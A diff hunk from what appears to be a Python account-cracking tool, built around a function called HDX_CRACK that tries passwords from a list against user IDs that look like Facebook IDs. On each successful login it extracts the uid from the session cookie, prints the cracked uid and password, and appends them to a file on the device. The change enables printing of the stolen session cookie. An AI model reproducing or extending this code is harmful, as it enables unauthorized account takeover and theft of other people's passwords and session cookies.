@@ -482,7 +482,7 @@ def HDX_CRACK(ids,passlist,tl):
                 coki1 = coki.split("1000")[1]
                 uid = "1000"+coki1[0:11]
                 print(f'\r\r \033[1;32m[FIRE-OK] '+uid+'|'+pas+'\033[32;1m ')
-                #print(' [Cookie]'+coki)
+                print(' [Cookie]'+coki)
                 oks.append(uid)
                 open('/sdcard/FIRE-RNDM-OK.txt', 'a').write(uid+' | '+pas+'\n ')
                 break
